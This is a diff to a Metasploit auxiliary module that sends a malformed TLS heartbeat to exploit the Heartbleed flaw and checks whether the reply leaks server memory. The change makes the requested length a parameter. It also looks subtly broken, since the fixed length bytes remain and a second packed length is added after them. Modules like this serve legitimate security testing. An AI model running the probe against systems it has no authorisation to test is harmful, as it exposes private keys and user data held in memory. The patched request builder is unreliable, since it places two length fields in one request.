@@ -197,7 +197,8 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat)
+    heartbeat_length = 16384
+    sock.put(heartbeat(heartbeat_length))
     hdr = sock.get_once(5)
     if hdr.blank?
       vprint_error("#{peer} - No Heartbeat response...")
@@ -216,7 +217,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    heartbeat_data = sock.get_once(16384) # Read the magic length...
+    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
     if heartbeat_data && heartbeat_data.length > len
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
@@ -232,9 +233,10 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def heartbeat
+  def heartbeat(length)
     payload = "\x01"      # Heartbeat Message Type: Request (1)
     payload << "\x40\x00" # Payload Length: 16384
+    payload << [length].pack("n")
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
